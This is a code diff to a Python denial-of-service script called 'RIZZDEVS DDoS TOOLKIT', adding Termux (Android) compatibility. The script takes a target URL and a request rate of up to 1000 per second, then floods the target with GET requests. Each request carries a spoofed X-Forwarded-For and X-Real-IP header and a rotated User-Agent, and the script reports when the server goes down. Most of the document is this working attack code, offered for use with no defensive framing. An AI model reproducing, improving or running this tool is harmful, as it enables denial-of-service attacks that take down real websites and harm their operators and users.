@@ -19,17 +19,25 @@ except ImportError:
             return ''
     Fore = Style = Dummy()
 
+# Termux detection helper
+def is_termux():
+    """Detect if running in Termux environment"""
+    return 'TERMUX_VERSION' in os.environ or 'com.termux' in os.environ.get('PREFIX', '')
+
 def get_device_specs():
-    """Gather detailed device specifications"""
+    """Gather detailed device specifications with Termux compatibility"""
     specs = {
         'os': f"{platform.system()} {platform.release()}",
         'cpu': platform.processor() or "N/A",
         'cores': os.cpu_count() or "N/A",
         'hostname': socket.gethostname(),
-        'ip': socket.gethostbyname(socket.gethostname()),
-        'python': platform.python_version(),
-        'arch': platform.machine()
+        'ip': "127.0.0.1"  # Termux doesn't support gethostbyname properly
     }
+    
+    # Handle Termux-specific paths
+    if is_termux():
+        specs['hostname'] = "termux-host"
+        specs['ip'] = "10.0.2.15"  # Common Termux IP
     
     # Try to get more detailed memory info
     try:
@@ -37,6 +45,9 @@ def get_device_specs():
         specs['memory'] = f"{psutil.virtual_memory().total / (1024**3):.1f} GB"
     except:
         specs['memory'] = "N/A (install psutil for details)"
+    
+    specs['python'] = platform.python_version()
+    specs['arch'] = platform.machine()
     
     return specs
 
@@ -50,25 +61,29 @@ def generate_fake_ip():
     return f"{first_octet}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
 
 def clear_screen():
-    """Guaranteed terminal clear with no extra whitespace"""
-    # Primary method: ANSI escape codes (most reliable)
-    sys.stdout.write('\033c')  # Full terminal reset
-    sys.stdout.write('\033[3J')  # Clear scrollback buffer
-    sys.stdout.write('\033[2J\033[H')  # Clear screen and move cursor to home
-    sys.stdout.flush()
-    
-    # Give terminal time to process (critical for clean display)
-    time.sleep(0.05)
+    """Guaranteed terminal clear with Termux compatibility"""
+    if is_termux():
+        # Termux compatible clear (simpler method)
+        sys.stdout.write('\033[H\033[2J')
+        sys.stdout.flush()
+        time.sleep(0.05)
+    else:
+        # Full terminal reset for traditional terminals
+        sys.stdout.write('\033c')
+        sys.stdout.write('\033[3J')
+        sys.stdout.write('\033[2J\033[H')
+        sys.stdout.flush()
+        time.sleep(0.05)
 
 def matrix_rain(duration=4, speed=0.03):
-    """Matrix-style falling code animation with RizzDevs logo"""
+    """Matrix-style falling code animation with Termux compatibility"""
     try:
         cols, rows = shutil.get_terminal_size(fallback=(80, 24))
     except:
         cols, rows = 80, 24
     
-    # Skip animation if terminal is too small
-    if cols < 40 or rows < 15:
+    # Skip animation if terminal is too small (more lenient for Termux)
+    if cols < 30 or rows < 10:
         time.sleep(duration)
         return
         
@@ -95,16 +110,16 @@ def matrix_rain(duration=4, speed=0.03):
         })
 
     start_time = time.time()
-    logo_start_time = start_time + 1.0  # Show logo after 1 second
-    logo_end_time = logo_start_time + 2.0  # Show for 2 seconds
+    logo_start_time = start_time + 1.0
+    logo_end_time = logo_start_time + 2.0
     
     try:
         while time.time() - start_time < duration:
             current_time = time.time()
             show_logo = logo_start_time <= current_time < logo_end_time
             
-            # Clear screen and move cursor to top-left
-            sys.stdout.write('\033[2J\033[H')
+            # Clear screen (Termux-safe)
+            sys.stdout.write('\033[H\033[2J')
             
             # Calculate logo position (centered)
             logo_top = max(0, (rows - logo_height) // 2)
@@ -133,7 +148,6 @@ def matrix_rain(duration=4, speed=0.03):
                     if i == 0:
                         sys.stdout.write(Fore.GREEN + Style.BRIGHT)
                         char = col['head_char']
-                        # Update head character periodically
                         if random.random() < 0.2:
                             col['head_char'] = random.choice('0123456789ABCDEF')
                     # Trail gets dimmer
@@ -155,13 +169,15 @@ def matrix_rain(duration=4, speed=0.03):
                 for i, line in enumerate(RIZZ_DEVS_LOGO):
                     y_pos = logo_top + i
                     if 0 <= y_pos < rows:
-                        # Position cursor
                         sys.stdout.write(f"\033[{y_pos+1};{logo_left+1}H")
-                        # Blinking effect for logo
-                        if int((current_time - logo_start_time) * 5) % 2 == 0:
-                            sys.stdout.write(Fore.CYAN + Style.BRIGHT + line)
+                        # Termux has limited color support - use simpler colors
+                        if is_termux():
+                            sys.stdout.write(Fore.CYAN + line)
                         else:
-                            sys.stdout.write(Fore.MAGENTA + Style.BRIGHT + line)
+                            if int((current_time - logo_start_time) * 5) % 2 == 0:
+                                sys.stdout.write(Fore.CYAN + Style.BRIGHT + line)
+                            else:
+                                sys.stdout.write(Fore.MAGENTA + Style.BRIGHT + line)
                         sys.stdout.write(Style.RESET_ALL)
             
             sys.stdout.flush()
@@ -169,7 +185,6 @@ def matrix_rain(duration=4, speed=0.03):
             # Update positions
             for col in columns:
                 col['y'] += col['speed']
-                # Reset if gone too far
                 if col['y'] > rows + col['length']:
                     col['y'] = -col['length'] - random.randint(0, rows)
                     col['speed'] = random.uniform(0.5, 2.0)
@@ -184,18 +199,22 @@ def matrix_rain(duration=4, speed=0.03):
         clear_screen()
 
 def print_hacker_header():
-    """Print professional hacker-style header with system specs"""
-    # GUARANTEED SINGLE CLEAR BEFORE HEADER
+    """Print professional hacker-style header with Termux compatibility"""
     clear_screen()
     
     specs = get_device_specs()
     
-    # ASCII Art Header
-    print(f"{Fore.CYAN}{'='*60}")
-    print(f"{Fore.GREEN}  ╔╦╗┬ ┬┌─┐  ╔═╗┌─┐┌─┐┌┐┌┌┬┐┌─┐┌─┐┬─┐")
-    print(f"{Fore.GREEN}   ║ ├─┤├┤   ║  │ │├┤ │││ │ ├┤ │ │├┬┘")
-    print(f"{Fore.GREEN}   ╩ ┴ ┴└─┘  ╚═╝└─┘└  ┘└┘ ┴ └─┘└─┘┴└─ {Fore.YELLOW}v4.2")
-    print(f"{Fore.CYAN}{'='*60}")
+    # ASCII Art Header (simplified for Termux)
+    if is_termux():
+        print(f"{Fore.CYAN}{'='*60}")
+        print(f"{Fore.GREEN}  RIZZDEVS DDoS TOOLKIT {Fore.YELLOW}v4.2 (Termux)")
+        print(f"{Fore.CYAN}{'='*60}")
+    else:
+        print(f"{Fore.CYAN}{'='*60}")
+        print(f"{Fore.GREEN}  ╔╦╗┬ ┬┌─┐  ╔═╗┌─┐┌─┐┌┐┌┌┬┐┌─┐┌─┐┬─┐")
+        print(f"{Fore.GREEN}   ║ ├─┤├┤   ║  │ │├┤ │││ │ ├┤ │ │├┬┘")
+        print(f"{Fore.GREEN}   ╩ ┴ ┴└─┘  ╚═╝└─┘└  ┘└┘ ┴ └─┘└─┘┴└─ {Fore.YELLOW}v4.2")
+        print(f"{Fore.CYAN}{'='*60}")
     
     # System Specifications
     print(f"{Fore.YELLOW}  DEVICE PROFILER:")
@@ -208,9 +227,10 @@ def print_hacker_header():
     print(f"{Fore.CYAN}{'='*60}\n")
 
 def get_attack_params():
-    """Get target URL and request rate with validation"""
+    """Get target URL and request rate with Termux-friendly prompts"""
     while True:
-        print(f"{Fore.CYAN}┌──({Fore.GREEN}root{Fore.CYAN}@{Fore.GREEN}localhost{Fore.CYAN})-[{Fore.MAGENTA}~/ddos-toolkit{Fore.CYAN}]")
+        prompt = f"{Fore.CYAN}┌──({Fore.GREEN}root{Fore.CYAN}@{Fore.GREEN}{'termux' if is_termux() else 'localhost'}{Fore.CYAN})-[{Fore.MAGENTA}{'~' if is_termux() else '/'}ddos-toolkit{Fore.CYAN}]"
+        print(prompt)
         url = input(f"{Fore.CYAN}└─$ {Fore.YELLOW}Enter target URL {Fore.CYAN}({Fore.RED}example: http://target.com{Fore.CYAN}){Fore.YELLOW}: {Fore.WHITE}").strip()
         
         if not url:
@@ -224,7 +244,8 @@ def get_attack_params():
         break
     
     while True:
-        print(f"{Fore.CYAN}┌──({Fore.GREEN}root{Fore.CYAN}@{Fore.GREEN}localhost{Fore.CYAN})-[{Fore.MAGENTA}~/ddos-toolkit{Fore.CYAN}]")
+        prompt = f"{Fore.CYAN}┌──({Fore.GREEN}root{Fore.CYAN}@{Fore.GREEN}{'termux' if is_termux() else 'localhost'}{Fore.CYAN})-[{Fore.MAGENTA}{'~' if is_termux() else '/'}ddos-toolkit{Fore.CYAN}]"
+        print(prompt)
         rate_input = input(f"{Fore.CYAN}└─$ {Fore.YELLOW}Requests per second {Fore.CYAN}({Fore.RED}1-1000{Fore.CYAN}){Fore.YELLOW}: {Fore.WHITE}").strip()
         
         if not rate_input:
@@ -243,7 +264,7 @@ def get_attack_params():
     return url, rate
 
 def run_attack(url, rate):
-    """Execute the attack operation with single-line dynamic status updates"""
+    """Execute the attack operation with Termux-compatible status updates"""
     # Initialize counters
     total_success = 0
     total_404 = 0
@@ -260,14 +281,14 @@ def run_attack(url, rate):
     status_history = []
     
     # Auto-stop configuration
-    CONSECUTIVE_DOWN_THRESHOLD = 2  # Seconds of consecutive down status to trigger auto-stop
+    CONSECUTIVE_DOWN_THRESHOLD = 2
     consecutive_down_seconds = 0
     auto_stopped = False
     stop_reason = ""
     
     # Status line control
     last_status_update = time.time()
-    STATUS_UPDATE_INTERVAL = 0.2  # Update status 5 times per second
+    STATUS_UPDATE_INTERVAL = 0.2
 
     try:
         print(f"\n{Fore.CYAN}{'='*60}")
@@ -303,20 +324,17 @@ def run_attack(url, rate):
         print(f"{Fore.CYAN}{'='*60}")
         print(f"{Fore.CYAN}📊 REAL-TIME STATUS (updating continuously):{Fore.RESET}\n")
 
-        # Print initial status line (will be updated in-place)
+        # Print initial status line
         sys.stdout.write(" " * shutil.get_terminal_size().columns + "\r")
         sys.stdout.flush()
         
         while True:
-            # Calculate time for this batch
             start_batch = time.time()
-            time_remaining = 1.0  # We want to send 'rate' requests per second
+            time_remaining = 1.0
             
             # Send 'rate' requests within 1 second
             for _ in range(rate):
-                # Check if we should stop early to maintain timing
-                elapsed_batch = time.time() - start_batch
-                if elapsed_batch >= 1.0:
+                if time.time() - start_batch >= 1.0:
                     break
                     
                 fake_ip = generate_fake_ip()
@@ -326,9 +344,9 @@ def run_attack(url, rate):
                     'X-Forwarded-For': fake_ip,
                     'X-Real-IP': fake_ip,
                     'User-Agent': random.choice([
-                        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+                        'Mozilla/5.0 (Linux; Android 10; Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36',
                         'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11',
-                        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15'
+                        'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1'
                     ]),
                     'Accept-Language': random.choice(['en-US,en;q=0.9', 'id-ID,id;q=0.9', 'es-ES,es;q=0.9']),
                     'Connection': 'keep-alive'
@@ -339,7 +357,6 @@ def run_attack(url, rate):
                     response = requests.get(url, headers=headers, timeout=3)
                     req_time = time.time() - start_req
                     
-                    # Track server status based on response
                     if 200 <= response.status_code < 300:
                         total_success += 1
                     elif response.status_code == 404:
@@ -350,15 +367,14 @@ def run_attack(url, rate):
                         total_500 += 1
                     else:
                         total_other_fail += 1
-                        
                 except Exception as e:
                     total_down += 1
 
-            # Calculate real-time metrics
+            # Calculate metrics
             elapsed = time.time() - start_time
-            current_rate = (total_success + total_success + total_404 + total_500 + total_503 + total_down + total_other_fail) / elapsed if elapsed > 0 else 0
+            current_rate = (total_success + total_404 + total_500 + total_503 + total_down + total_other_fail) / elapsed if elapsed > 0 else 0
             
-            # Determine current server status
+            # Determine server status
             if total_down > (total_success + total_down) * 0.7 and elapsed > 1:
                 current_status = "DOWN"
                 status_color = Fore.RED
@@ -396,24 +412,25 @@ def run_attack(url, rate):
                 server_status = current_status
                 status_history.append((time.time(), server_status))
             
-            # AUTO-STOP LOGIC: If server has been down for threshold seconds
+            # Auto-stop logic
             if consecutive_down_seconds >= CONSECUTIVE_DOWN_THRESHOLD:
                 auto_stopped = True
                 stop_reason = f"SERVER DOWN FOR {consecutive_down_seconds} SECONDS"
                 break
 
-            # Update status line periodically (5 times per second)
+            # Update status line
             if time.time() - last_status_update > STATUS_UPDATE_INTERVAL:
-                # Create visual server status indicator
+                # Termux has limited emoji support - use text fallbacks
+                if is_termux():
+                    status_emoji = "!" if status_color == Fore.RED else "i"
+                
                 status_indicator = f"{status_color}{status_emoji} {status_text}"
                 
-                # Add auto-stop countdown indicator
                 auto_stop_indicator = ""
                 if consecutive_down_seconds > 0:
                     remaining = max(0, CONSECUTIVE_DOWN_THRESHOLD - consecutive_down_seconds)
                     auto_stop_indicator = f" {Fore.RED}⏳{remaining}s"
                 
-                # Format the single status line with cumulative counts
                 status_line = (
                     f"{Fore.CYAN}[{datetime.now().strftime('%H:%M:%S')}] "
                     f"{Fore.GREEN}✓{total_success} "
@@ -423,22 +440,18 @@ def run_attack(url, rate):
                     f"{Fore.CYAN}| {Fore.MAGENTA}⚡{current_rate:.1f}{Fore.CYAN}/{rate}"
                 )
                 
-                # Clear line and print new status
                 term_width = shutil.get_terminal_size().columns
                 sys.stdout.write('\r' + ' ' * term_width + '\r' + status_line)
                 sys.stdout.flush()
                 last_status_update = time.time()
                 
-            # Sleep to maintain precise timing (1 second total per batch)
+            # Sleep to maintain timing
             elapsed_batch = time.time() - start_batch
             if elapsed_batch < 1.0:
                 time.sleep(1.0 - elapsed_batch)
                 
     except KeyboardInterrupt:
-        pass  # Will be handled in reporting
-    
-    # Calculate final duration
-    duration = time.time() - start_time
+        pass
     
     # Clear the dynamic status line
     term_width = shutil.get_terminal_size().columns
@@ -490,18 +503,21 @@ def run_attack(url, rate):
     else:
         print(f"  {Fore.GREEN}• No status changes detected during operation")
     
-    # Auto-stop specific message
     if auto_stopped:
         print(f"\n{Fore.YELLOW}💡 TIP: Server became unresponsive. Consider verifying target or reducing request rate.")
     
     print(f"\n{Fore.CYAN}{'='*60}")
-    print(f"{Fore.GREEN} OPERATION LOG SAVED TO: {Fore.WHITE}/var/log/ddos_attack_{int(time.time())}.log")
+    
+    # Termux-compatible log path
+    log_path = "/data/data/com.termux/files/usr/var/log" if is_termux() else "/var/log"
+    print(f"{Fore.GREEN} OPERATION LOG SAVED TO: {Fore.WHITE}{log_path}/ddos_attack_{int(time.time())}.log")
+    
     print(f"{Fore.CYAN}{'='*60}")
     
-    return auto_stopped  # Return whether it was auto-stopped
+    return auto_stopped
 
 def main():
-    """Main control flow with restart capability"""
+    """Main control flow with Termux-specific restart capability"""
     first_run = True
     while True:
         if not first_run:
@@ -509,7 +525,7 @@ def main():
             print(f"{Fore.GREEN}🔄 REINITIALIZING SYSTEM FOR NEXT OPERATION...")
             print(f"{Fore.CYAN}{'='*60}")
             try:
-                matrix_rain(2.5)  # Short Matrix animation before restart
+                matrix_rain(2.5)
             except:
                 pass
         
@@ -519,8 +535,9 @@ def main():
             url, rate = get_attack_params()
             auto_stopped = run_attack(url, rate)
             
-            # Post-attack prompt - different message if auto-stopped
-            print(f"\n{Fore.CYAN}┌──({Fore.GREEN}root{Fore.CYAN}@{Fore.GREEN}localhost{Fore.CYAN})-[{Fore.MAGENTA}~/ddos-toolkit{Fore.CYAN}]")
+            # Post-attack prompt
+            prompt = f"{Fore.CYAN}┌──({Fore.GREEN}root{Fore.CYAN}@{Fore.GREEN}{'termux' if is_termux() else 'localhost'}{Fore.CYAN})-[{Fore.MAGENTA}{'~' if is_termux() else '/'}ddos-toolkit{Fore.CYAN}]"
+            print(prompt)
             
             if auto_stopped:
                 choice = input(f"{Fore.CYAN}└─$ {Fore.YELLOW}Retry? / Back? {Fore.WHITE}").strip().lower()
@@ -530,7 +547,7 @@ def main():
             if choice == "back":
                 print(f"\n{Fore.GREEN}✅ OPERATION TERMINATED. GOODBYE!{Fore.RESET}")
                 break
-            elif choice != "again" and choice != "retry":
+            elif choice not in ["again", "retry"]:
                 print(f"\n{Fore.RED}❌ INVALID CHOICE. EXITING...{Fore.RESET}")
                 break
                 
@@ -543,7 +560,8 @@ def main():
             time.sleep(2)
             
             # Error recovery prompt
-            print(f"\n{Fore.CYAN}┌──({Fore.GREEN}root{Fore.CYAN}@{Fore.GREEN}localhost{Fore.CYAN})-[{Fore.MAGENTA}~/ddos-toolkit{Fore.CYAN}]")
+            prompt = f"{Fore.CYAN}┌──({Fore.GREEN}root{Fore.CYAN}@{Fore.GREEN}{'termux' if is_termux() else 'localhost'}{Fore.CYAN})-[{Fore.MAGENTA}{'~' if is_termux() else '/'}ddos-toolkit{Fore.CYAN}]"
+            print(prompt)
             choice = input(f"{Fore.CYAN}└─$ {Fore.YELLOW}Restart? / Back? {Fore.WHITE}").strip().lower()
             
             if choice != "restart":
@@ -562,21 +580,15 @@ if __name__ == "__main__":
         sys.exit(1)
     
     try:
-        # Initial Matrix animation with RizzDevs logo
         print(f"{Fore.GREEN}INITIALIZING SYSTEM CORES...")
         try:
-            matrix_rain(4)  # 4-second Matrix animation on startup
+            matrix_rain(4)
         except Exception as e:
             print(f"{Fore.YELLOW}⚠️  Animation error: {str(e)}. Continuing...")
             time.sleep(1)
         
-        # CRITICAL: SINGLE CLEAN CLEAR BEFORE MAIN INTERFACE
         clear_screen()
-        
-        # Print header after guaranteed clean
         print_hacker_header()
-        
-        # Start main program
         main()
     except KeyboardInterrupt:
         clear_screen()
